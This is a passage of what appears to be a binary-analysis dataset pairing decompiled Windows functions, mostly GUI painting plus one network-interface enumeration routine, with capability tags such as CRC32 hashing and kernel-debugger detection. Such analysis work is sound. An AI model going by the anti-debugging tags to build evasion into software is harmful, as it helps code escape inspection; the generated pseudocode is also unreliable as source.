4) == 0)) &&\n           ((((*(iVar1 + 0x18) & 1) == 0 && (*(iVar1 + 0x10) != 0)) && (*(iVar1 + 0x14) != 0)))) {\n            fcn.00451af0();\n        }\n    }\n    return;\n}\n",
        "token_count": 444
    },
    "00453844": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00453844(uint arg_8h, int32_t *arg_ch, uint *arg_10h, uint arg_14h)\n\n{\n    int32_t *in_EAX;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_24h = *arg_10h;\n    uStack36 = arg_10h[1];\n    uStack32 = arg_10h[2];\n    uStack28 = arg_10h[3];\n    var_4h = in_EAX;\n    if ((arg_14h == 0) || (*(arg_14h + 0x490658) != *(in_EDX + 0x61))) {\n        if ((*(in_EDX + 0x175) != 0) && (*(in_EDX + 0x179) != 0)) {\n            var_8h = (**(**(in_EDX + 0x78) + 0x10))();\n            var_ch = (**(**(in_EDX + 0x78) + 0x10))();\n            var_10h = (**(**(in_EDX + 0x78) + 0x10))();\n            var_14h = (**(**(in_EDX + 0x78) + 0x10))();\n            if ((*(in_EDX + 0x61) & 4) == 0) {\n                if ((*(in_EDX + 0x61) & 1) == 0) {\n                    var_24h = *(in_EDX + 0x165);\n                    var_8h = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_10h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_10h & 1) != 0);\n                    }\n                    var_8h = var_8h - iVar1;\n                }\n            }\n            else if ((*(in_EDX + 0x61) & 1) == 0) {\n                var_8h = *in_ECX - (*(in_EDX + 0x175) - *(in_EDX + 0x165));\n            }\n            else {\n                var_10h = *in_ECX - (*(in_EDX + 0x175) - *(in_EDX + 0x165));\n            }\n            if ((*(in_EDX + 0x61) & 8) == 0) {\n                if ((*(in_EDX + 0x61) & 2) == 0) {\n                    var_24h = *(in_EDX + 0x169);\n                    var_ch = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_14h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_14h & 1) != 0);\n                    }\n                    var_ch = var_ch - iVar1;\n                }\n            }\n            else if ((*(in_EDX + 0x61) & 2) == 0) {\n                var_ch = in_ECX[1] - (*(in_EDX + 0x179) - *(in_EDX + 0x169));\n            }\n            else {\n                var_14h = in_ECX[1] - (*(in_EDX + 0x179) - *(in_EDX + 0x169));\n            }\n            if (arg_8h != '\\0') {\n                if (*0x453c1c != (*0x453c18 & *(in_EDX + 0x61))) {\n                    var_24h = *(in_EDX + 0x16d);\n                    var_8h = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_10h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_10h & 1) != 0);\n                    }\n                    var_8h = var_8h - iVar1;\n                }\n                if (*0x453c1c != (*0x453c20 & *(in_EDX + 0x61))) {\n                    var_24h = *(in_EDX + 0x171);\n                    var_ch = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_14h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_14h & 1) != 0);\n                    }\n                    var_ch = var_ch - iVar1;\n                }\n            }\n            fcn.0045dd34(1, var_14h, var_10h);\n        }\n        if (arg_14h == 0) {\n            return;\n        }\n    }\n    var_10h = arg_ch[2] - *arg_ch;\n    if (((var_10h < 0) || (arg_14h - 3 < 2)) || (arg_14h == 6)) {\n        var_10h = (**(**(in_EDX + 0x78) + 0x10))();\n    }\n    var_14h = arg_ch[3] - arg_ch[1];\n    if (((var_14h < 0) || (arg_14h - 1 < 2)) || (arg_14h == 6)) {\n        var_14h = (**(**(in_EDX + 0x78) + 0x10))();\n    }\n    var_8h = *arg_ch;\n    var_ch = arg_ch[1];\n    // switch table (7 cases) at 0x453aa7\n    switch(arg_14h) {\n    case 1:\n        arg_ch[1] = arg_ch[1] + var_14h;\n        break;\n    case 2:\n        arg_ch[3] = arg_ch[3] - var_14h;\n        var_ch = arg_ch[3];\n        break;\n    case 3:\n        *arg_ch = *arg_ch + var_10h;\n        break;\n    case 4:\n        arg_ch[2] = arg_ch[2] - var_10h;\n        var_8h = arg_ch[2];\n        break;\n    case 6:\n        var_8h = *(in_EDX + 0x40);\n        var_ch = *(in_EDX + 0x44);\n        (**(*var_4h + 0xac))(&var_24h, arg_ch, &var_14h, &var_10h, &var_ch);\n    }\n    fcn.0045dd34(1, var_14h, var_10h);\n    iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n    if ((iVar1 != var_10h) || (iVar1 = (**(**(in_EDX + 0x78) + 0x10))(),  iVar1 != var_14h)) {\n    // switch table (6 cases) at 0x453b6f\n        switch(arg_14h) {\n        case 1:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[1] = arg_ch[1] - (var_14h - iVar1);\n            break;\n        case 2:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[3] = arg_ch[3] + (var_14h - iVar1);\n            break;\n        case 3:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            *arg_ch = *arg_ch - (var_10h - iVar1);\n            break;\n        case 4:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[2] = arg_ch[2] + (var_10h - iVar1);\n            break;\n        case 5:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[2] = arg_ch[2] + (var_10h - iVar1);\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[3] = arg_ch[3] + (var_14h - iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1927
    },
    "00454778": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454778(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x454896;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack288;\n    fcn.00403af4();\n    *param_2 = in_EAX[0x19];\n    param_2[1] = 0x44000000;\n    fcn.00454710();\n    if ((*(in_EAX + 0x14) & 1) != 0) {\n        param_2[1] = param_2[1] | 0x2000000;\n        param_2[2] = param_2[2] | 0x10000;\n    }\n    if ((*(in_EAX + 7) & 0x10) == 0) {\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (cVar1 == '\\0') {\n            param_2[1] = param_2[1] | 0x8000000;\n        }\n    }\n    if (*(in_EAX + 0x76) != '\\0') {\n        param_2[1] = param_2[1] | 0x10000;\n    }\n    param_2[3] = in_EAX[0x10];\n    param_2[4] = in_EAX[0x11];\n    param_2[5] = in_EAX[0x12];\n    param_2[6] = in_EAX[0x13];\n    if (in_EAX[0xc] == 0) {\n        param_2[7] = in_EAX[0x71];\n    }\n    else {\n        iVar2 = fcn.00458568();\n        param_2[7] = iVar2;\n    }\n    param_2[9] = 0xb;\n    param_2[10] = sub.user32.dll_DefWindowProcA;\n    uVar3 = 0;\n    iVar2 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    param_2[0xf] = iVar2;\n    param_2[0x10] = 0;\n    param_2[0xd] = *0x4957f8;\n    fcn.00404530();\n    fcn.00405794();\n    fcn.0040a918();\n    *in_FS_OFFSET = uVar3;\n    uStack288 = 0x45489d;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 648
    },
    "00456440": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456440(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack148;\n    uint uStack144;\n    uchar *puStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uVar3;\n    uint uStack112;\n    int32_t iStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint var_50h;\n    int32_t nXDest;\n    int32_t nHeight;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint var_10h;\n    uint hgdiobj;\n    uint hdc;\n    int32_t *var_4h;\n    \n    if ((*(in_EAX + 0x90) != '\\0') && (*(param_2 + 4) == 0)) {\n        puStack96 = 0x456497;\n        cVar1 = fcn.0042fa90();\n        if (cVar1 == '\\0') {\n            puStack96 = &fcn.00456440::var_50h;\n            uStack100 = 0x456559;\n            uStack100 = fcn.00458568();\n            puStack104 = 0x45655f;\n            uVar3 = sub.user32.dll_BeginPaint();\n            puStack104 = var_3ch - nHeight;\n            iStack108 = var_40h - nXDest;\n            uStack112 = uVar3;\n            hgdiobj = sub.gdi32.dll_CreateCompatibleBitmap();\n            *in_FS_OFFSET = &stack0xffffff84;\n            uStack132 = 0x45658c;\n            uStack136 = sub.gdi32.dll_CreateCompatibleDC();\n            uStack132 = hgdiobj;\n            puStack140 = 0x45659c;\n            hdc = uStack136;\n            var_10h = sub.gdi32.dll_SelectObject();\n            uStack144 = 0x456629;\n            uStack148 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff6c;\n            puStack140 = &stack0xfffffffc;\n            sub.gdi32.dll_SetWindowOrgEx(hdc, nXDest, nHeight, 0);\n            fcn.00451abc(hdc);\n            *(param_2 + 4) = hdc;\n            fcn.00456440();\n            *(param_2 + 4) = 0;\n            sub.gdi32.dll_BitBlt\n                      (uVar3, nXDest, nHeight, var_40h - nXDest, var_3ch - nHeight, hdc, nXDest, nHeight, 0xcc0020);\n            *in_FS_OFFSET = uVar3;\n            sub.gdi32.dll_SelectObject(hdc, var_10h, 0x456630);\n            return;\n        }\n        puStack96 = &fcn.00456440::var_50h;\n        uStack100 = 0x4564ab;\n        uStack100 = fcn.00458568();\n        puStack104 = 0x4564b1;\n        sub.user32.dll_BeginPaint();\n        iStack108 = 0x456546;\n        uStack112 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff90;\n        puStack104 = &stack0xfffffffc;\n        fcn.0042ee54(&fcn.00456440::hdc, 0);\n        fcn.00451abc(hdc);\n        uVar3 = 4;\n        uStack132 = 0x4564fe;\n        fcn.00451abc(4);\n        uStack132 = 0x45650c;\n        cVar1 = fcn.004047dc();\n        if (cVar1 == '\\0') {\n            uStack132 = 0x45651c;\n            fcn.0042ef4c();\n        }\n        uStack132 = 0x456526;\n        fcn.0042eee0();\n        *in_FS_OFFSET = uVar3;\n        fcn.00458568();\n        uStack132 = 0x456545;\n        sub.user32.dll_EndPaint();\n        return;\n    }\n    if ((*(in_EAX + 0x55) & 1) == 0) {\n        puStack96 = 0x456470;\n        var_4h = in_EAX;\n        iVar2 = fcn.00454658();\n        if (iVar2 == 0) {\n            puStack96 = 0x45647e;\n            (**(*var_4h + -0x10))();\n            return;\n        }\n    }\n    puStack96 = 0x45648d;\n    fcn.00455cc0();\n    return;\n}\n",
        "token_count": 1061
    },
    "00456964": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456964(uint param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    \n    if ((*0x4569b4 == (*0x4569b0 & *(in_EAX + 7))) && (iVar2 = *(param_2 + 8),  (*(iVar2 + 0x18) & 1) == 0)) {\n        cVar3 = fcn.00452500();\n        if (cVar3 == '\\0') {\n            puVar1 = iVar2 + 0x18;\n            *puVar1 = *puVar1 | 1;\n        }\n    }\n    (**(*in_EAX + -0x10))();\n    return;\n}\n",
        "token_count": 184
    },
    "004569b8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.004569b8(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.00458880();\n    fcn.0045339c();\n    (**(*in_EAX + -0x10))();\n    fcn.0045419c();\n    if ((*(in_EAX + 7) & 1) == 0) {\n        fcn.0040484c();\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "0045758c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.0045758c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00454658(),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.0045461c();\n            if (((*(piVar3 + 0x57) != '\\0') && (cVar1 = (**(*piVar3 + 0x50))(),  cVar1 != '\\0')) &&\n               ((((*(piVar3 + 0x52) & 1) != 0 && (iVar4 = fcn.00451abc(*(*(arg_8h + -4) + 8)),  iVar4 != 0)) ||\n                ((cVar1 = fcn.004047dc(),  cVar1 != '\\0' && (cVar1 = fcn.0045758c(arg_8h),  cVar1 != '\\0')))))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 302
    },
    "0045932c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045932c(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    \n    (**(*in_EAX + -0x10))();\n    piVar1 = *(param_2 + 8);\n    sub.user32.dll_InflateRect(piVar1, -in_EAX[0x67], -in_EAX[0x67]);\n    if (*(in_EAX + 0x195) != '\\0') {\n        iVar2 = 0;\n        if (*(in_EAX + 0x193) != '\\0') {\n            iVar2 = in_EAX[0x66];\n        }\n        if (*(in_EAX + 0x65) != '\\0') {\n            iVar2 = iVar2 + in_EAX[0x66];\n        }\n        if ((*(in_EAX + 0x192) & 1) != 0) {\n            *piVar1 = *piVar1 + iVar2;\n        }\n        if ((*(in_EAX + 0x192) & 2) != 0) {\n            piVar1[1] = piVar1[1] + iVar2;\n        }\n        if ((*(in_EAX + 0x192) & 4) != 0) {\n            piVar1[2] = piVar1[2] - iVar2;\n        }\n        if ((*(in_EAX + 0x192) & 8) != 0) {\n            piVar1[3] = piVar1[3] - iVar2;\n        }\n    }\n    return;\n}\n",
        "token_count": 365
    },
    "004593bc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004593bc(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint dx;\n    uint var_38h;\n    int32_t lprcSrc1;\n    int32_t dy;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t nLeftRect;\n    int32_t nTopRect;\n    int32_t nRightRect;\n    int32_t nBottomRect;\n    uint hDC;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_8h = param_2;\n    var_4h = in_EAX;\n    if ((*(in_EAX + 0x195) == '\\0') && (in_EAX[0x67] == 0)) {\n        uStack80 = 0x459681;\n        (**(*in_EAX + -0x10))();\n        uStack80 = 0x459689;\n        cVar3 = fcn.004329f4();\n        if ((cVar3 != '\\0') && ((*(var_4h + 0x52) & 2) != 0)) {\n            uStack80 = 0x45969b;\n            fcn.00432198();\n            uStack80 = 0x4596a5;\n            fcn.0043286c();\n        }\n        return;\n    }\n    uStack80 = 0x4593ef;\n    uStack80 = fcn.00458568();\n    puStack84 = 0x4593f5;\n    hDC = sub.user32.dll_GetWindowDC();\n    uStack88 = 0x45966f;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    uVar4 = fcn.00458568(&fcn.004593bc::nLeftRect);\n    sub.user32.dll_GetClientRect(uVar4);\n    uVar4 = fcn.00458568(&fcn.004593bc::lprcSrc1);\n    sub.user32.dll_GetWindowRect(uVar4);\n    uVar4 = fcn.00458568(&fcn.004593bc::lprcSrc1, 2);\n    sub.user32.dll_MapWindowPoints(0, uVar4);\n    sub.user32.dll_OffsetRect(&fcn.004593bc::nLeftRect, -lprcSrc1, -dy);\n    sub.gdi32.dll_ExcludeClipRect(hDC, nLeftRect, nTopRect, nRightRect, nBottomRect);\n    iVar2 = dy;\n    iVar1 = lprcSrc1;\n    sub.user32.dll_InflateRect(&fcn.004593bc::nLeftRect, var_4h[0x67], var_4h[0x67]);\n    lprcSrc1 = nLeftRect;\n    dy = nTopRect;\n    var_24h = nRightRect;\n    var_20h = nBottomRect;\n    uVar4 = fcn.00458568(0xfffffff0);\n    uVar5 = sub.user32.dll_GetWindowLongA(uVar4);\n    if ((uVar5 & 0x200000) != 0) {\n        iVar6 = (***0x492428)(0x14);\n        var_24h = var_24h + iVar6;\n    }\n    if ((uVar5 & 0x100000) != 0) {\n        iVar6 = (***0x492428)(0x15);\n        var_20h = var_20h + iVar6;\n    }\n    if (*(var_4h + 0x195) != '\\0') {\n        iVar6 = 0;\n        if (*(var_4h + 0x193) != 0) {\n            iVar6 = var_4h[0x66];\n        }\n        if (*(var_4h + 0x65) != 0) {\n            iVar6 = iVar6 + var_4h[0x66];\n        }\n        if ((*(var_4h + 0x192) & 1) != 0) {\n            lprcSrc1 = lprcSrc1 - iVar6;\n        }\n        if ((*(var_4h + 0x192) & 2) != 0) {\n            dy = dy - iVar6;\n        }\n        if ((*(var_4h + 0x192) & 4) != 0) {\n            var_24h = var_24h + iVar6;\n        }\n        if ((*(var_4h + 0x192) & 8) != 0) {\n            var_20h = var_20h + iVar6;\n        }\n        sub.user32.dll_DrawEdge\n                  (hDC, &fcn.004593bc::lprcSrc1, \n                   *((*(var_4h + 0x193) & 0x7f) * 4 + 0x49071c) | *((*(var_4h + 0x65) & 0x7f) * 4 + 0x49072c), \n                   *(var_4h + 0x192) | *(*(var_4h + 0x195) * 4 + 0x49073c) | *(*(var_4h + 0x1d9) * 4 + 0x49074c) |\n                   0x2000);\n    }\n    sub.gdi32.dll_IntersectClipRect(hDC, lprcSrc1, dy, var_24h, var_20h);\n    if (*(var_8h + 4) == 1) {\n        sub.user32.dll_OffsetRect(&fcn.004593bc::lprcSrc1, -iVar1, -iVar2);\n    }\n    else {\n        sub.gdi32.dll_GetRgnBox(*(var_8h + 4), &fcn.004593bc::nLeftRect);\n        uVar4 = fcn.00458568(&fcn.004593bc::nLeftRect, 2);\n        sub.user32.dll_MapWindowPoints(0, uVar4);\n        sub.user32.dll_IntersectRect(&fcn.004593bc::lprcSrc1, &fcn.004593bc::lprcSrc1, &fcn.004593bc::nLeftRect);\n        sub.user32.dll_OffsetRect(&fcn.004593bc::lprcSrc1, -iVar1, -iVar2);\n    }\n    uVar7 = fcn.00424f6c();\n    uVar4 = hDC;\n    sub.user32.dll_FillRect(hDC, &fcn.004593bc::lprcSrc1, uVar7);\n    *in_FS_OFFSET = uVar4;\n    uVar4 = fcn.00458568(hDC, 0x459676);\n    sub.user32.dll_ReleaseDC(uVar4);\n    return;\n}\n",
        "token_count": 1608
    },
    "00459770": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00459770(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(param_2 + 0xc) == 1) {\n        uStack20 = 0x4597f6;\n        (**(*in_EAX + -0x10))();\n    }\n    else {\n        if (((*(param_2 + 8) & 1) == 0) || (*(in_EAX + 0x57) != '\\0')) {\n            uStack20 = *(param_2 + 4);\n            puStack24 = 0x4597a0;\n            uVar1 = sub.gdi32.dll_SaveDC();\n            uStack28 = 0x4597d9;\n            uStack32 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe0;\n            puStack24 = &stack0xfffffffc;\n            fcn.00455cc0();\n            *in_FS_OFFSET = uStack32;\n            puStack24 = 0x4597f6;\n            uStack32 = *(param_2 + 4);\n            uStack28 = uVar1;\n            sub.gdi32.dll_RestoreDC();\n            return;\n        }\n        uStack20 = 0x4597ea;\n        (**(*in_EAX + -0x10))();\n    }\n    return;\n}\n",
        "token_count": 354
    },
    "0046786c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.0046786c(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint var_328h;\n    uint var_324h;\n    uint var_320h;\n    uint var_31ch;\n    uint var_318h;\n    uint var_208h;\n    uint var_1b8h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_190h;\n    uint var_18ch;\n    uint32_t var_188h;\n    uint var_184h;\n    uint uStackY172;\n    uint uStackY164;\n    uint uStackY160;\n    uint uStackY156;\n    uint uStackY152;\n    uchar *puStackY148;\n    uint uStackY144;\n    uint uStackY140;\n    uint uStackY136;\n    uint uStackY132;\n    uint *arg_8h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_24h = &stack0xfffffffc;\n    iVar4 = 0x65;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_18h = 0x46788f;\n    var_19ch = param_2;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    fcn.004059cc();\n    var_18h = 0x4678a0;\n    fcn.00405fe8();\n    var_1ch = 0x467bcb;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046786c::var_20h;\n    var_28h = 0x467b5a;\n    var_2ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046786c::var_2ch;\n    var_18h = &stack0xfffffffc;\n    fcn.00405864();\n    iVar4 = fcn.0040a478();\n    uVar1 = var_188h;\n    while (iVar4 == 0) {\n        var_188h = uVar1;\n        if ((uVar1 & 2) == 0) {\n            fcn.004055c8();\n        }\n        else {\n            fcn.004055c8();\n        }\n        if ((uVar1 & 0x20) == 0) {\n            fcn.004055c8();\n        }\n        else {\n            fcn.004055c8();\n        }\n        if ((uVar1 & 1) == 0) {\n            fcn.004055c8();\n        }\n        else {\n            fcn.004055c8();\n        }\n        if ((uVar1 & 4) == 0) {\n            fcn.004055c8();\n        }\n        else {\n            fcn.004055c8();\n        }\n        puVar3 = var_18h;\n        uVar2 = var_1ch;\n        fcn.004058e0();\n        if ((uVar1 & 0x10) == 0) {\n            fcn.00405864();\n            fcn.004059dc();\n            sub.shell32.dll_SHGetFileInfoA();\n            fcn.004057a0();\n            arg_8h = &fcn.0046786c::var_1b0h;\n            fcn.00405864();\n            fcn.0048ad74(arg_8h);\n            fcn.0040c8e8();\n            fcn.0040c8e8();\n            uStackY132 = 0x467b03;\n            fcn.00409e4c(var_190h);\n            uStackY136 = 0x467c2c;\n            uStackY140 = var_10h;\n            uStackY144 = 0x467c2c;\n            puStackY148 = puVar3;\n            uStackY152 = 0x467c2c;\n            uStackY156 = uVar2;\n            uStackY160 = 0x467c2c;\n            uStackY164 = var_28h;\n            var_2ch = 0x467c38;\n            uStackY172 = 0x467b3b;\n            fcn.004058e0();\n        }\n        else {\n            fcn.0048ad74(&fcn.0046786c::var_1b0h);\n            fcn.0040c8e8();\n            fcn.0040c8e8();\n            var_2ch = 0x467c38;\n            fcn.004058e0();\n        }\n        iVar4 = fcn.0040a4c8();\n        uVar1 = var_188h;\n    }\n    *in_FS_OFFSET = var_2ch;\n    var_24h = 0x467b74;\n    fcn.0040a4ec();\n    var_24h = var_8h;\n    var_28h = 0x467c44;\n    var_2ch = var_ch;\n    fcn.004058e0();\n    *in_FS_OFFSET = var_2ch;\n    var_24h = 0x467bd2;\n    var_28h = 0x467bac;\n    fcn.00405554();\n    var_28h = 0x467bbd;\n    fcn.004060ac();\n    var_28h = 0x467bca;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1425
    },
    "0046d2f4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.0046d2f4(void)\n\n{\n    uint32_t uVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffff94c;\n    int32_t iStack1688;\n    uint uStack1684;\n    uchar *puStack1680;\n    uint uStack1676;\n    uint uStack1672;\n    uint uStack1668;\n    int32_t iStack1664;\n    uint uStack1660;\n    uchar *puStack1656;\n    uint var_664h;\n    uint var_660h;\n    uint var_65ch;\n    uint var_658h;\n    uint var_654h;\n    uint var_1ch;\n    uint in;\n    uint uStack24;\n    uint uStack20;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t s;\n    \n    puStack1656 = &stack0xfffffffc;\n    uStack1660 = 0x46d574;\n    iStack1664 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff980;\n    uStack1668 = 0x46d32d;\n    fcn.00405530();\n    uStack1668 = 0;\n    uStack1672 = 1;\n    uStack1676 = 2;\n    puStack1680 = 0x46d338;\n    iVar2 = sub.wsock32.dll_socket();\n    s = iVar2;\n    if (iVar2 != -1) {\n        uStack1684 = 0x46d541;\n        iStack1688 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffff968;\n        puStack1680 = &stack0xfffffffc;\n        iVar3 = sub.WS2_32.DLL_WSAIoctl\n                          (iVar2, 0x4004747f, 0, 0, &fcn.0046d2f4::var_658h, 0x400, &fcn.0046d2f4::var_8h, 0, 0);\n        if ((iVar3 != -1) && (-1 < var_8h / 0x4c + -1)) {\n            var_ch = var_8h / 0x4c;\n            puVar4 = &fcn.0046d2f4::var_654h;\n            do {\n                var_1ch = *puVar4;\n                in = puVar4[1];\n                uStack24 = puVar4[2];\n                uStack20 = puVar4[3];\n                sub.wsock32.dll_inet_ntoa(puVar4[1]);\n                fcn.00405728(0x46d58c, *in_EAX);\n                fcn.004058e0(0x46d59c, 0);\n                var_1ch = puVar4[0xc];\n                in = puVar4[0xd];\n                uStack24 = puVar4[0xe];\n                uStack20 = puVar4[0xf];\n                sub.wsock32.dll_inet_ntoa(puVar4[0xd]);\n                fcn.00405728(0x46d5a8, *in_EAX);\n                fcn.004058e0(0x46d59c, 0);\n                var_1ch = puVar4[6];\n                in = puVar4[7];\n                uStack24 = puVar4[8];\n                uStack20 = puVar4[9];\n                sub.wsock32.dll_inet_ntoa(puVar4[7]);\n                fcn.00405728(0x46d5bc, *in_EAX);\n                fcn.004058e0(0x46d59c, 0);\n                uVar1 = puVar4[-1];\n                if ((uVar1 & 1) == 1) {\n                    fcn.004058e0(0x46d59c, 0x46d5dc, *in_EAX);\n                }\n                else {\n                    fcn.004058e0(0x46d59c, 0x46d5f4, *in_EAX);\n                }\n                if ((uVar1 & 2) == 2) {\n                    fcn.004058e0(0x46d59c, 0x46d60c, *in_EAX);\n                }\n                else {\n                    fcn.004058e0(0x46d59c, 0x46d628, *in_EAX);\n                }\n                if ((uVar1 & 4) == 4) {\n                    fcn.004058e0(0x46d59c, 0x46d644, *in_EAX);\n                }\n                else {\n                    fcn.004058e0(0x46d59c, 0x46d660, *in_EAX);\n                }\n                iVar2 = 0x46d59c;\n                fcn.004058e0();\n                puVar4 = puVar4 + 0x13;\n                var_ch = var_ch + -1;\n            } while (var_ch != 0);\n        }\n        *in_FS_OFFSET = iVar2;\n        in_stack_fffff94c = s;\n        sub.wsock32.dll_closesocket();\n    }\n    *in_FS_OFFSET = in_stack_fffff94c;\n    fcn.00405554(0x46d57b);\n    return;\n}\n",
        "token_count": 1224
    },
    "00470aec": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
